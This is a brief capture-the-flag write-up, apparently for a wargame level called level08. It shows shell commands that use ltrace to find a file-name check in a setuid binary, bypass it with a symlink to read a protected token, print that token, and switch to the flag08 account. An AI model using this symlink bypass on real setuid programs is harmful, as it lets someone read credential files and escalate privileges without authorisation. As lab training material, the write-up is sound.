# level08

```bash
ls -l
# -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
# -rw-------  1 flag08 flag08    26 Mar  5  2016 token

./level08
# ./level08 [file to read]

./level08 token
# You may not access 'token'

ltrace ./level08 token
# strstr("token", "token")
# printf("You may not access '%s'\n", "token")
# ==> It compares file name to token

ln -s ~/token /tmp/abc
./level08 /tmp/abc
# quif5eloekouj29ke0vouxean

su flag08
```
